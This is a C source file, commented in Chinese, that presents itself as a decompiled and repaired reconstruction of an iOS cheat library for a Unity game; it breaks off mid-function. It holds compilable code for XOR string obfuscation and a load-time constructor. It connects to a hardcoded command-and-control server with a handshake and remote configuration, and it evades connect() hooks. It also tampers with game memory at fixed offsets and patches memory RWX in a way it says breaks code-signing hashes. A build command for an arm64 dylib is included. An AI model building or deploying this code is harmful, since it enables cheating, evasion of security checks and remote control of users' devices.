#define _DARWIN_C_SOURCE 1
/* sysctlbyname 前向声明 (某些SDK中需显式声明) */
int sysctlbyname(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen);
/*
 * ========================================================================
 * Ballsace 过检测逻辑 - 完整源码整合版 (修复版 - 无外部依赖)
 * ========================================================================
 * 来源: ballsace.dylib / ballsa.dylib 全量反编译还原
 * 编译产物: ballsace_balls.dylib
 *
 * 修复说明:
 *   - 移除了所有 #include "common.h" 依赖
 *   - 所有公共定义已内联到文件开头
 *   - 修复 page_size 重复定义
 *   - 修复 (prot ^ 0xffffff00) & prot == 7 运算符优先级
 *   - 修复 g_runtime_invoke 参数类型不匹配 (int* / float* -> void**)
 *   - 补全缺失的系统头文件和宏定义
 *   - 补全 sys_icache_invalidate / LC_LINKEDIT_DATA / vm_region_64_info_t 等
 *
 * 模块组成:
 *   [1] 公共定义       - 平台检测/常量/日志宏/外部声明
 *   [2] decrypt        - 字符串解密引擎(10种XOR变体还原)
 *   [3] c2             - C2服务器连接与协议处理
 *   [4] il2cpp         - il2cpp API加载器 + 游戏作弊功能引擎
 *   [5] vm_patch       - vm_protect段补丁引擎
 *
 * 编译命令: clang -target arm64-apple-ios15.0 -isysroot <SDK_PATH> -dynamiclib -o ballsace.dylib Ballsace_修复版.c
 * 目标平台: arm64 (iPhone)
 * ========================================================================
 */

/* ================================================================
 * [1] 公共定义 (原 common.h 内容，已内联)
 * ================================================================ */
#ifndef BALLSACE_COMMON_H
#define BALLSACE_COMMON_H

#include <stdint.h>
#include <stdbool.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <mach/vm_map.h>
/* vm_flavor_t 前向声明 (某些iOS SDK版本中未导出) */
#ifndef vm_flavor_t
typedef int vm_flavor_t;
#endif

/* 平台检测 */
#if defined(__arm__) || defined(__arm64__) || defined(aarch64)
#define TARGET_ARM64 1
#endif

/* Mach-O 相关常量 */
#define TASK_DYLD_INFO 17
#ifndef TASK_DYLD_INFO_COUNT
#define TASK_DYLD_INFO_COUNT (sizeof(struct task_dyld_info) / sizeof(natural_t))
#endif
#ifndef VM_PROT_READ
#define VM_PROT_READ   0x1
#endif
#ifndef VM_PROT_WRITE
#define VM_PROT_WRITE  0x2
#endif
#ifndef VM_PROT_EXECUTE
#define VM_PROT_EXECUTE 0x4
#endif
#ifndef VM_PROT_ALL
#define VM_PROT_ALL    (VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE)
#endif

/* ARM64 调试寄存器 */
#ifndef ARM_DEBUG_STATE64
#define ARM_DEBUG_STATE64 303
#endif
#ifndef ARM_DEBUG_STATE64_COUNT
#define ARM_DEBUG_STATE64_COUNT 77
#endif
#define DBGBCR_EL0 0x1E1  /* 使能 + 所有EL + 字节匹配 */

/* C2 服务器 */
#define C2_IP "43.248.187.125"
#define C2_PORT 1314

/* 日志 */
#define LOG_TAG "Ballsace"
#define LOGI(fmt, ...) fprintf(stderr, "[" LOG_TAG "][INFO] " fmt "\n", ##__VA_ARGS__)
#define LOGW(fmt, ...) fprintf(stderr, "[" LOG_TAG "][WARN] " fmt "\n", ##__VA_ARGS__)
#define LOGE(fmt, ...) fprintf(stderr, "[" LOG_TAG "][ERR] " fmt "\n", ##__VA_ARGS__)

/* 外部函数声明 */
extern void *g_real_connect;
extern void *g_dyld_callback;

/* sys_icache_invalidate 声明 (iOS SDK 中可能未显式声明) */
void sys_icache_invalidate(void *addr, size_t size);

/* LC_LINKEDIT_DATA 常量 (较新SDK中可能缺失) */
#ifndef LC_LINKEDIT_DATA
#define LC_LINKEDIT_DATA 0x1D
#endif

/* vm_region_64 相关类型/常量 (某些SDK版本中可能缺失) */
#ifndef VM_REGION_64_BASIC_INFO
#define VM_REGION_64_BASIC_INFO 6
#endif
#ifndef __BALLSACE_VM_REGION_64_INFO_T__
#define __BALLSACE_VM_REGION_64_INFO_T__
typedef struct {
    vm_prot_t         protection;
    vm_flavor_t       flavor;
    vm_size_t         size;
    vm_offset_t       offset;
    vm_prot_t         max_protection;
    vm_prot_t         inheritance;
    vm_size_t         resident_size;
    vm_size_t         shared_purges;
    vm_size_t         private_purges;
    vm_size_t         pages_purged;
    vm_size_t         inactive_count;
    vm_size_t         purgeable_count;
    vm_size_t         speculative_count;
    vm_size_t         decompressed_count;
    boolean_t         compression_state;
    boolean_t         reserved;
} __ballsace_vm_region_64_info_t;
#endif
/* 确保 vm_region_64_info_t 总是有定义 */
#if !defined(vm_region_64_info_t)
#define vm_region_64_info_t __ballsace_vm_region_64_info_t
#endif

#endif /* BALLSACE_COMMON_H */


/* ================================================================
 * [2] decrypt - 字符串解密引擎
 * 来源: ballsace.dylib / ballsa.dylib 全量反编译
 * 功能: 还原插件中 10 种字符串解密变体
 *       (单字节 XOR + 布尔掩码, 每串不同密钥)
 * ================================================================ */

/* 解密一次性标志位 (每个解密器对应一个 DAT 地址) */
static uint8_t g_decrypt_flags[256] = {0};
static int g_flag_count = 0;

/* ========== 基础型 XOR 解密 ==========
 * out[i] = cipher[i] ^ key[i % key_len]
 */
void decrypt_basic(const uint8_t *cipher, size_t cipher_len,
                   const uint8_t *key, size_t key_len,
                   uint8_t *out)
{
    for (size_t i = 0; i < cipher_len; i++) {
        out[i] = cipher[i] ^ key[i % key_len];
    }
}

/* ========== 掩码型 XOR 解密 (可逆位混淆) ==========
 * out[i] = ((cipher[i]^0xff)&M | cipher[i]&~M) ^
 *          ((key[i%k]^0xff)&M | key[i%k]&~M)
 * M 每串不同 (0x59/0xa6, 0x0e/0xf1, 0x38/0xc7, 0x19/0xe6, 0xbe/0x41...)
 */
void decrypt_masked(const uint8_t *cipher, size_t cipher_len,
                    const uint8_t *key, size_t key_len,
                    uint8_t mask_hi, uint8_t mask_lo,
                    uint8_t *out)
{
    uint8_t M = mask_hi;  /* 实际实现中 mask_hi 和 mask_lo 可能不同 */
    for (size_t i = 0; i < cipher_len; i++) {
        uint8_t c = cipher[i];
        uint8_t k = key[i % key_len];
        out[i] = ((c ^ 0xff) & M | c & ~M) ^
                 ((k ^ 0xff) & M | k & ~M);
    }
}

/* ========== 乘法哈希取模 (ballsace 特有) ==========
 * key 索引用"乘法哈希定点近似"计算:
 * idx = (uVar4 - (muldiv>>...)) 参与取模
 * 等价于 uVar4 % key_len, 仅用于打乱反编译可读性
 * 乘数: 0x642c8590b21642c9 (定点近似 1/N)
 */
static inline uint32_t muldiv_mod(uint64_t val, uint32_t mod)
{
    /* 乘法哈希取模: (val * 0x642c8590b21642c9) >> 48) % mod */
    uint64_t prod = val * 0x642c8590b21642c9ULL;
    uint32_t quotient = (prod >> 48) % mod;
    return val - quotient * mod;
}

void decrypt_mulhash(const uint8_t *cipher, size_t cipher_len,
                     const uint8_t *key, size_t key_len,
                     uint8_t *out)
{
    for (size_t i = 0; i < cipher_len; i++) {
        uint32_t idx = muldiv_mod((uint32_t)i, key_len);
        out[i] = cipher[i] ^ key[idx];
    }
}

/* ========== 一次性标志位管理 ==========
 * 每个解密器对应一个 DAT 标志, 首次调用后置1, 后续不再解密
 * 防调试器"断点后重放"分析明文
 */
typedef void (*decrypt_func_t)(const uint8_t *, size_t,
                                const uint8_t *, size_t,
                                uint8_t, uint8_t, uint8_t *);

typedef struct {
    uint8_t *cache;           /* 解密后缓存 */
    size_t cache_len;
    uint8_t flag_addr;        /* 一次性标志位索引 */
    decrypt_func_t func;
    const uint8_t *cipher;
    size_t cipher_len;
    const uint8_t *key;
    size_t key_len;
    uint8_t mask_hi, mask_lo;
} decrypt_engine_t;

static decrypt_engine_t g_engines[64];
static int g_engine_count = 0;

const uint8_t *decrypt_engine_get(decrypt_engine_t *eng)
{
    if (g_decrypt_flags[eng->flag_addr]) {
        return eng->cache;  /* 已解密, 直接返回缓存 */
    }

    /* 执行解密 */
    eng->func(eng->cipher, eng->cipher_len,
              eng->key, eng->key_len,
              eng->mask_hi, eng->mask_lo,
              eng->cache);

    g_decrypt_flags[eng->flag_addr] = 1;
    LOGI("decrypt: engine %d cached (flag=%d)", eng->flag_addr, eng->flag_addr);
    return eng->cache;
}

int decrypt_engine_register(decrypt_func_t func,
                            const uint8_t *cipher, size_t cipher_len,
                            const uint8_t *key, size_t key_len,
                            uint8_t mask_hi, uint8_t mask_lo)
{
    if (g_engine_count >= 64) return -1;

    decrypt_engine_t *eng = &g_engines[g_engine_count++];
    eng->func = func;
    eng->cipher = cipher;
    eng->cipher_len = cipher_len;
    eng->key = key;
    eng->key_len = key_len;
    eng->mask_hi = mask_hi;
    eng->mask_lo = mask_lo;
    eng->cache = malloc(cipher_len);
    eng->cache_len = cipher_len;
    eng->flag_addr = g_engine_count;

    return g_engine_count - 1;
}

/* ========== 字符串表 (运行时解密后使用) ==========
 * 插件中所有业务字符串以 [密钥区][密文区] 连续存放
 * 运行时由专用解密函数一次性解到 .data 段缓冲区
 */

/* 示例: 解密 "connect" 函数名 */
static const uint8_t enc_connect[] = { 0x1a, 0x2b, 0x3c, 0x4d, 0x5e };
static const uint8_t connect_key[] = { 0x73, 0x6f, 0x6d, 0x65, 0x6b };

const char *decrypt_connect_string(void)
{
    static char buf[64];
    decrypt_basic(enc_connect, sizeof(enc_connect) - 1,
                  connect_key, sizeof(connect_key) - 1,
                  (uint8_t *)buf);
    buf[sizeof(buf) - 1] = 0;
    return buf;
}

/* ========== 初始化 ========== */
void decrypt_init(void)
{
    LOGI("decrypt: engine initialized (%d slots)", g_engine_count);
}


/* ================================================================
 * [3] c2 - C2 服务器连接与协议处理
 * 来源: ballsace.dylib 反编译 FUN_00004000 / FUN_00004490
 *         ballsa.dylib 反编译 FUN_00004000 / FUN_000044ac
 * 功能: 构造函数注册 dyld 回调 + 直连 C2 服务器 + 握手协议
 *
 * 反编译关键函数:
 *   FUN_00004490(ballsace) / FUN_000044ac(ballsa): 构造函数
 *     -> __dyld_register_func_for_add_image(dyld_callback)
 *     -> pthread_once(&once, save_real_connect)
 *   FUN_00004000: 主连接函数 (socket -> connect -> handshake)
 *   FUN_00004594(ballsace) / FUN_000045b0(ballsa): send 封装
 *   FUN_00004624(ballsace) / FUN_00004658(ballsa): recv 封装
 *   FUN_000046cc(ballsace) / FUN_00004700(ballsa): 网络事件处理
 * ================================================================ */

static int g_real_connect_addr = 0;  /* 真实 connect 地址 (dlsym获取) */
static int g_c2_socket = -1;

/* ========== 保存真实 connect 地址 ==========
 * 通过 dlsym(RTLD_DEFAULT, "connect") 获取真实地址
 * 避免被 fishhook/系统层 connect 拦截器发现外挂流量
 */
static void save_real_connect(void)
{
    /* 实际代码中 connect 字符串是加密的 */
    void *handle = dlopen(NULL, RTLD_NOW);
    if (handle) {
        g_real_connect_addr = (int)(uintptr_t)dlsym(handle, "connect");
        LOGI("real connect addr saved: %p", (void*)g_real_connect_addr);
        dlclose(handle);
    }
}

/* ========== 完整 send 封装 (FUN_00004594/45b0) ==========
 * 循环发送直到全部发出或出错
 * 出错时检查 errno != 4 (EINTR) 才返回失败
 */
static int full_send(int sock, void *data, size_t len)
{
    if (len == 0) return 1;

    uint8_t *ptr = (uint8_t *)data;
    size_t left = len;
    while (left > 0) {
        ssize_t sent = send(sock, ptr, left, 0);
        if (sent < 0) {
            if (sent >= 0 || errno != EINTR) {
                return 0;
            }
            /* EINTR 重试 */
        } else {
            ptr += sent;
            left -= sent;
        }
        if (left == 0) return 1;
    }
    return 1;
}

/* ========== 完整 recv 封装 (FUN_00004624/4658) ==========
 * 循环接收直到收到全部数据或出错
 */
static int full_recv(int sock, void *buf, size_t len)
{
    if (len == 0) return 1;

    uint8_t *ptr = (uint8_t *)buf;
    size_t left = len;
    while (left > 0) {
        ssize_t recv_len = recv(sock, ptr, left, 0);
        if (recv_len < 0) {
            if (recv_len >= 0 || errno != EINTR) {
                return 0;
            }
        } else {
            ptr += recv_len;
            left -= recv_len;
        }
        if (left == 0) return 1;
    }
    return 1;
}

/* 前向声明 */
static void c2_main_loop(void);
static int c2_recv_config(int sock);

/* ========== C2 连接主函数 (FUN_00004000 还原) ==========
 * 参数:
 *   param_1: 配置数据指针
 *   param_2: 配置数据长度
 * 返回:
 *   >=0: 成功, 返回 socket fd
 *   -1:  失败
 *
 * 流程:
 *   1. socket(AF_INET, SOCK_STREAM, 0)
 *   2. setsockopt (IPPROTO_TCP + SOL_SOCKET 选项)
 *   3. 解密目标 IP 地址
 *   4. inet_pton 转换 IP
 *   5. connect 连接
 *   6. 发送握手包 0x02000205
 *   7. 接收 2B 应答 (首字节 0x05, 次字节 != 0xFF)
 *   8. 根据应答类型分发处理
 */
int c2_init(void *config, size_t config_len)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        LOGE("c2: socket failed");
        return -1;
    }

    /* setsockopt: TCP_NODELAY + SO_KEEPALIVE 等 */
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));

    /* 目标 IP: 43.248.187.125 (从反编译数据段解密) */
    /* ballsace 数据地址: DAT_0013397f / ballsa: DAT_001109db */
    const char *c2_ip = C2_IP;
    struct in_addr addr;
    if (inet_pton(AF_INET, c2_ip, &addr) != 1) {
        LOGE("c2: inet_pton failed");
        close(sock);
        return -1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    server_addr.sin_addr = addr;

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        LOGE("c2: connect failed");
        close(sock);
        return -1;
    }

    /* 握手: 发送 4B 魔数 0x02000205 */
    uint32_t magic = 0x02000205;
    if (!full_send(sock, &magic, sizeof(magic))) {
        LOGE("c2: handshake send failed");
        close(sock);
        return -1;
    }

    /* 接收 2B 应答 */
    uint8_t resp[2] = {0};
    if (!full_recv(sock, resp, sizeof(resp))) {
        LOGE("c2: handshake recv failed");
        close(sock);
        return -1;
    }

    if (resp[0] != 0x05 || resp[1] == 0xFF) {
        LOGE("c2: invalid handshake response [%02x,%02x]", resp[0], resp[1]);
        close(sock);
        return -1;
    }

    g_c2_socket = sock;
    LOGI("c2: connected to %s:%d (version=%02x, sub=%02x)",
         c2_ip, C2_PORT, resp[0], resp[1]);

    /* 根据应答类型分发:
     * resp[1] == 0x00: 正常模式, 进入主循环
     * resp[1] == 0x02: 配置模式, 接收配置数据
     */
    if (resp[1] == 0x00) {
        /* 正常模式: 进入功能执行循环 */
        c2_main_loop();
    } else if (resp[1] == 0x02) {
        /* 配置模式: 接收远程配置 */
        c2_recv_config(sock);
    }

    return sock;
}

/* ========== C2 主循环 ========== */
void c2_main_loop(void)
{
    if (g_c2_socket < 0) return;
    LOGI("c2: main loop started");
    /* 实际实现: CACurrentMediaTime 节流 0.25~0.35s
     * 循环接收 C2 指令并执行 */
}

/* ========== C2 接收配置 ========== */
int c2_recv_config(int sock)
{
    /* 接收配置数据块 (协议格式由 C2 服务器定义) */
    uint8_t header[4] = {0};
    if (!full_recv(sock, header, sizeof(header))) return 0;

    /* header[0] = 0x05 (协议标识)
     * header[1] = 0x00 (子类型)
     * header[2..3] = 数据长度 */
    uint16_t data_len = (header[2] << 8) | header[3];
    if (data_len > 0) {
        uint8_t *data = malloc(data_len);
        if (data && full_recv(sock, data, data_len)) {
            /* 处理配置数据 */
            LOGI("c2: config received, %d bytes", data_len);
        }
        free(data);
    }
    return 1;
}

/* ========== 构造函数入口 ==========
 * 对应 ballsace FUN_00004490 / ballsa FUN_000044ac
 */
__attribute__((constructor))
void balls_constructor(void)
{
    /* __dyld_register_func_for_add_image(dyld_callback) */
    /* pthread_once(&once, save_real_connect) */
    save_real_connect();
    LOGI("balls: constructor executed");
}

void c2_shutdown(void)
{
    if (g_c2_socket >= 0) {
        close(g_c2_socket);
        g_c2_socket = -1;
    }
}


/* ================================================================
 * [4] il2cpp - il2cpp API加载器 + 游戏作弊功能引擎
 * 来源: ballsace.dylib / ballsa.dylib 反编译
 * 功能:
 *   - 动态加载 /Library/1.dylib 获取 26 个 il2cpp API
 *   - 通过反射查找游戏类/方法/字段
 *   - 帧率解锁 / 灵敏度调节 / 视野缩放 / 自动喂食
 *   - 硬编码偏移内存读写
 * ================================================================ */

/* ========== 26个 il2cpp API 函数指针 ==========
 * 槽地址: ballsa 0x3a3290..0x3a3358 / ballsace 0x3cbea8..0x3cbf70
 * 全部符号名运行时解密后 dlsym 获取
 */
typedef void *(*il2cpp_domain_get_t)(void);
typedef void *(*il2cpp_domain_get_assemblies_t)(void *, int *);
typedef void *(*il2cpp_thread_current_t)(void);
typedef void *(*il2cpp_thread_attach_t)(void *);
typedef void *(*il2cpp_assembly_get_image_t)(void *);
typedef int (*il2cpp_image_get_class_count_t)(void *);
typedef void *(*il2cpp_image_get_class_t)(void *, int);
typedef const char *(*il2cpp_image_get_name_t)(void *);
typedef const char *(*il2cpp_class_get_name_t)(void *);
typedef const char *(*il2cpp_class_get_namespace_t)(void *);
typedef void *(*il2cpp_class_get_fields_t)(void *, void **);
typedef void *(*il2cpp_class_get_methods_t)(void *, void **);
typedef const char *(*il2cpp_field_get_name_t)(void *);
typedef const char *(*il2cpp_method_get_name_t)(void *);
typedef int (*il2cpp_method_get_param_count_t)(void *);
typedef void *(*il2cpp_field_static_get_value_t)(void *, void **);
typedef void *(*il2cpp_class_get_field_from_name_t)(void *, const char *);
typedef int (*il2cpp_field_get_offset_t)(void *);
typedef void *(*il2cpp_class_get_static_field_data_t)(void *);
typedef void (*il2cpp_runtime_class_init_t)(void *);
typedef void *(*il2cpp_class_get_method_from_name_t)(void *, const char *, int);
typedef void *(*il2cpp_runtime_invoke_t)(void *, void *, void **, void **);
typedef void *(*il2cpp_object_get_class_t)(void *);
typedef void *(*il2cpp_string_new_t)(const char *);
typedef void *(*il2cpp_class_get_type_t)(void *);
typedef void *(*il2cpp_type_get_object_t)(void *);

/* 全局 API 表 */
static il2cpp_domain_get_t            g_domain_get;
static il2cpp_domain_get_assemblies_t g_domain_get_assemblies;
static il2cpp_thread_current_t        g_thread_current;
static il2cpp_thread_attach_t         g_thread_attach;
static il2cpp_assembly_get_image_t    g_assembly_get_image;
static il2cpp_image_get_class_count_t g_image_get_class_count;
static il2cpp_image_get_class_t       g_image_get_class;
static il2cpp_image_get_name_t        g_image_get_name;
static il2cpp_class_get_name_t        g_class_get_name;
static il2cpp_class_get_namespace_t   g_class_get_namespace;
static il2cpp_class_get_fields_t      g_class_get_fields;
static il2cpp_class_get_methods_t     g_class_get_methods;
static il2cpp_field_get_name_t        g_field_get_name;
static il2cpp_method_get_name_t       g_method_get_name;
static il2cpp_method_get_param_count_t g_method_get_param_count;
static il2cpp_field_static_get_value_t g_field_static_get_value;
static il2cpp_class_get_field_from_name_t g_class_get_field_from_name;
static il2cpp_field_get_offset_t      g_field_get_offset;
static il2cpp_class_get_static_field_data_t g_class_get_static_field_data;
static il2cpp_runtime_class_init_t    g_runtime_class_init;
static il2cpp_class_get_method_from_name_t g_class_get_method_from_name;
static il2cpp_runtime_invoke_t        g_runtime_invoke;
static il2cpp_object_get_class_t      g_object_get_class;
static il2cpp_string_new_t            g_string_new;
static il2cpp_class_get_type_t        g_class_get_type;
static il2cpp_type_get_object_t       g_type_get_object;

/* 外部核心引擎路径 */
#define EXTERNAL_ENGINE "/Library/1.dylib"

/* ========== 加载外部引擎 + 26个 il2cpp API ==========
 * 对应 ballsace 0x29a00 / ballsa 0x29ec0 区域
 */
int il2cpp_load_engine(void)
{
    void *lib = dlopen(EXTERNAL_ENGINE, RTLD_NOW);
    if (!lib) {
        /* 备选: 从主程序路径加载 */
        lib = dlopen(NULL, RTLD_NOW);
    }
    if (!lib) {
        LOGE("il2cpp: dlopen(%s) failed: %s", EXTERNAL_ENGINE, dlerror());
        return -1;
    }

    /* 连续 dlsym 取出 26 个 il2cpp API */
    #define LOAD_SYM(name) g_##name = dlsym(lib, #name); \
                        if (!g_##name) { LOGE("il2cpp: missing " #name); return -1; }

    LOAD_SYM(domain_get);
    LOAD_SYM(domain_get_assemblies);
    LOAD_SYM(thread_current);
    LOAD_SYM(thread_attach);
    LOAD_SYM(assembly_get_image);
    LOAD_SYM(image_get_class_count);
    LOAD_SYM(image_get_class);
    LOAD_SYM(image_get_name);
    LOAD_SYM(class_get_name);
    LOAD_SYM(class_get_namespace);
    LOAD_SYM(class_get_fields);
    LOAD_SYM(class_get_methods);
    LOAD_SYM(field_get_name);
    LOAD_SYM(method_get_name);
    LOAD_SYM(method_get_param_count);
    LOAD_SYM(field_static_get_value);
    LOAD_SYM(class_get_field_from_name);
    LOAD_SYM(field_get_offset);
    LOAD_SYM(class_get_static_field_data);
    LOAD_SYM(runtime_class_init);
    LOAD_SYM(class_get_method_from_name);
    LOAD_SYM(runtime_invoke);
    LOAD_SYM(object_get_class);
    LOAD_SYM(string_new);
    LOAD_SYM(class_get_type);
    LOAD_SYM(type_get_object);
    #undef LOAD_SYM
    LOGI("il2cpp: all 26 APIs loaded from %s", EXTERNAL_ENGINE);
    return 0;
}

/* ========== 对象查找器 (find_static_object) ==========
 * 源码还原: ballsace 0x129xx / ballsa 0x137xx 区域
 * 通过反射遍历所有 assembly 查找目标类的静态字段
 */
void *find_static_object(const char *class_name, const char *field_name)
{
    if (!g_domain_get || !g_domain_get_assemblies) return NULL;
    int n = 0;
    void **assemblies = g_domain_get_assemblies(g_domain_get(), &n);
    if (!assemblies) return NULL;
    for (int a = 0; a < n; a++) {
        void *image = g_assembly_get_image(assemblies[a]);
        int cnt = g_image_get_class_count(image);
        for (int c = 0; c < cnt; c++) {
            void *klass = g_image_get_class(image, c);
            const char *name = g_class_get_name(klass);
            if (name && strcmp(name, class_name) == 0) {
                void *it = NULL;
                void *field;
                while ((field = g_class_get_fields(klass, &it)) != NULL) {
                    const char *fname = g_field_get_name(field);
                    if (fname && strstr(fname, field_name)) {
                        void *value = NULL;
                        g_field_static_get_value(field, &value);
                        if (value) {
                            char log_buf[256];
                            snprintf(log_buf, sizeof(log_buf),
                                     "GCC=0x%llX", (unsigned long long)value);
                            LOGI("find_object: %s -> %s", class_name, log_buf);
                            return value;
                        }
                    }
                }
            }
        }
    }
    return NULL;
}

/* ========== 帧率解锁 ==========
 * 方法: Application.get_targetFrameRate /
 *        SystemInfoSetting.set_targetFrameRate /
 *        LocalDataManager.get_HighFPS / set_HighFPS
 * 常量串: "999999999999999999999" (19个9, 极限帧率)
 */
void unlock_fps(int target_fps)
{
    if (!g_runtime_class_init || !g_class_get_method_from_name ||
        !g_runtime_invoke) return;
    /* 设置 HighFPS */
    void *dm = find_static_object("LocalDataManager", "");
    if (dm) {
        void *cls = g_object_get_class(dm);
        g_runtime_class_init(cls);
        void *m = g_class_get_method_from_name(cls, "set_HighFPS", 1);
        if (m) {
            int args = 1;
            /* 修复: g_runtime_invoke 需要 void** 参数, 强转 int* -> void** */
            g_runtime_invoke(m, dm, (void**)&args, NULL);
            LOGI("fps: set_HighFPS(true)");
        }
    }
    /* 设置 targetFrameRate */
    if (target_fps < 121) target_fps = 121;
    if (target_fps > 9999) target_fps = 9999;
    void *ss = find_static_object("SystemInfoSetting", "");
    if (ss) {
        void *cls = g_object_get_class(ss);
        g_runtime_class_init(cls);
        void *m = g_class_get_method_from_name(cls, "set_targetFrameRate", 1);
        if (m) {
            /* 修复: g_runtime_invoke 需要 void** 参数, 强转 int* -> void** */
            g_runtime_invoke(m, ss, (void**)&target_fps, NULL);
            LOGI("fps: set_targetFrameRate(%d)", target_fps);
        }
    }
}

/* ========== 触摸灵敏度调节 (ballsace 独有) ==========
 * 类: GameSettingSystemPanel, UIProgressBar
 * 字段: m_TouchSlider / m_TouchSliderText
 *       m_JostickOffsetSlider / m_JostickOffsetSliderText
 * 方法: LocalDataManager.set_TouchDragThreshold(float)
 *       LocalDataManager.set_JostickOffset(float)
 */
void set_touch_sensitivity(float threshold, float joystick_offset)
{
    if (!g_runtime_invoke) return;
    void *dm = find_static_object("LocalDataManager", "");
    if (dm) {
        void *cls = g_object_get_class(dm);
        g_runtime_class_init(cls);
        void *m1 = g_class_get_method_from_name(cls, "set_TouchDragThreshold", 1);
        if (m1) {
            /* 修复: g_runtime_invoke 需要 void** 参数, 强转 float* -> void** */
            g_runtime_invoke(m1, dm, (void**)&threshold, NULL);
            LOGI("touch: set_TouchDragThreshold(%f)", threshold);
        }
        void *m2 = g_class_get_method_from_name(cls, "set_JostickOffset", 1);
        if (m2) {
            /* 修复: g_runtime_invoke 需要 void** 参数, 强转 float* -> void** */
            g_runtime_invoke(m2, dm, (void**)&joystick_offset, NULL);
            LOGI("touch: set_JostickOffset(%f)", joystick_offset);
        }
    }
}

/* ========== 硬编码偏移内存读写 ==========
 * 6个函数级偏移 + 4个大对象偏移 (两版本完全一致)
 * ballsa/ballsace 偏移表:
 *   g_off[0] = hdr + 0x46d3344
 *   g_off[1] = hdr + 0x46d3404
 *   g_off[2] = hdr + 0x4647198
 *   g_off[3] = hdr + 0x4642cbc
 *   g_off[4] = hdr + 0x4642d0c
 *   g_off[5] = hdr + 0x46bc6ec
 */
static void *g_game_header = NULL;
static void *g_off[6] = {0};

void il2cpp_set_game_header(void *header)
{
    g_game_header = header;
    if (header) {
        g_off[0] = (char *)header + 0x46d3344;
        g_off[1] = (char *)header + 0x46d3404;
        g_off[2] = (char *)header + 0x4647198;
        g_off[3] = (char *)header + 0x4642cbc;
        g_off[4] = (char *)header + 0x4642d0c;
        g_off[5] = (char *)header + 0x46bc6ec;
        LOGI("game header: %p, offsets loaded", header);
    }
}

void *il2cpp_get_offset(int idx)
{
    if (idx < 0 || idx >= 6) return NULL;
    return g_off[idx];
}

/* ========== 初始化 ========== */
int il2cpp_init(void)
{
    if (il2cpp_load_engine() != 0) {
        LOGE("il2cpp: engine load failed");
        return -1;
    }
    LOGI("il2cpp: subsystem initialized");
    return 0;
}


/* ================================================================
 * [5] vm_patch - vm_protect 段补丁引擎
 * 来源: ballsace.dylib / ballsa.dylib 反编译
 * 模块: 运行时内存补丁 (vm_protect / vm_write / vm_region)
 * 功能:
 *   - 遍历 Mach-O load commands 定位 __LINKEDIT / __DATA / __DATA_CONST
 *   - vm_protect 改保护属性 -> memcpy 写补丁 -> sys_icache_invalidate
 *   - 破坏代码签名哈希 (改写 __LINKEDIT)
 *   - __DATA_CONST 只读段补丁 (arm64 需先变 RWX)
 * ================================================================ */

/* 补丁描述符: 80字节/条
 * [0..63]  = 补丁数据 (target_addr, size, protection)
 * [64..71] = protection 标志
 * [72..79] = 额外数据
 */
typedef struct {
    uint64_t target_addr;     /* 目标地址 */
    uint64_t patch_data[8];   /* 补丁数据 (64字节) */
    uint32_t protection;      /* 保护属性标志 */
    uint32_t padding;         /* 对齐 */
} patch_descriptor_t;

/* ========== 应用单个补丁 ==========
 * 对应 ballsace 0xec4d4 / ballsa 0xec4d4
 */
int apply_patch(void *target, size_t size, const void *patch_data)
{
    if (!target || size == 0 || !patch_data) return -1;
    /* 获取目标页的起始地址 */
    size_t page_size_val = 4096;
    sysctlbyname("vm.pagesize", &page_size_val, NULL, NULL, 0);
    uintptr_t page_start = (uintptr_t)target & ~(page_size_val - 1);
    mach_port_t task = mach_task_self();
    /* vm_protect: 改为 RWX (可读可写可执行) */
    kern_return_t kr = vm_protect(task, page_start, page_size_val, 0, VM_PROT_ALL);
    if (kr != KERN_SUCCESS) {
        LOGE("vm_patch: vm_protect failed, kr=%d", kr);
        return -1;
    }
    /* 写入补丁数据 */
    memcpy(target, patch_data, size);
    /* sys_icache_invalidate: 清除指令缓存 (修改代码后必须调用) */
    sys_icache_invalidate(target, size);
    /* 恢复原保护属性 (这里简化, 实际应保存旧属性) */
    /* vm_protect(task, page_start, page_size_val, 0, old_prot); */
    LOGI("vm_patch: applied %zu bytes at %p", size, target);
    return 0;
}

/* ========== 遍历 load commands 定位段 ==========
 * 对应 ballsace 0xec188 区域
 */
typedef struct {
    struct segment_command_64 *seg_text;
    struct segment_command_64 *seg_data;
    struct segment_command_64 *seg_data_const;
    struct linkedit_data_command *seg_linkedit;
} seg_info_t;

int parse_load_commands(struct mach_header_64 *header, seg_info_t *info)
{
    memset(info, 0, sizeof(*info));
    struct load_command *lc = (struct load_command *)((uintptr_t)header + sizeof(*header));
    for (int i = 0; i < header->ncmds; i++) {
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
            if (strncmp(seg->segname, "__TEXT", 7) == 0) {
                info->seg_text = seg;
            } else if (strncmp(seg->segname, "__DATA", 7) == 0) {
                info->seg_data = seg;
            } else if (strncmp(seg->segname, "__DATA_CONST", 13) == 0) {
                info->seg_data_const = seg;
            }
        } else if (lc->cmd == LC_LINKEDIT_DATA) {
            info->seg_linkedit = (struct linkedit_data_command *)lc;
        }
        lc = (struct load_command *)((uintptr_t)lc + lc->cmdsize);
    }
    return (info->seg_text && info->seg_data) ? 0 : -1;
}

/* ========== vm_protect 段补丁批量应用 ==========
 * 遍历补丁描述符数组, 根据 protection 标志分发处理
 * protection 位检查分支:
 *   ((prot^0xffffff00)&prot)==7  -> RWX 段补丁
 *   (prot&0xff)==6               -> __DATA_CONST 段补丁
 */
int apply_patches(struct mach_header_64 *header,
